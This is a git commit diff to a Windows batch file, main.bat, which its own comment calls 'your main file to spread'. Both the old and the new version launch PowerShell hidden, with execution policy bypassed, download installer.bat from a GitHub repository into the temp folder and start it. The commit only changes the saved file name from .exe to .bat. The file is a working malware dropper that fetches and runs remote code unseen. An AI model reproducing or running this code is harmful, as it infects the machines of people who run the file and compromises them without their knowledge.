40e909b968b7dd360ad4c47efd496913df09d167
walks111551 <aidenwalka@gmail.com>
2024-11-20 21:05:35 -0600

    Update main.bat

--- main.bat
+++ main.bat
@@ -1,5 +1,5 @@
 REM - This is your main file to spread.
 
 cd %TEMP%
-Powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/installer.bat' -OutFile installer.exe"
-start installer.exe
+Powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-Webrequest 'https://github.com/walks111551/09672018256120856125/blob/main/installer.bat' -OutFile installer.bat"
+start installer.bat
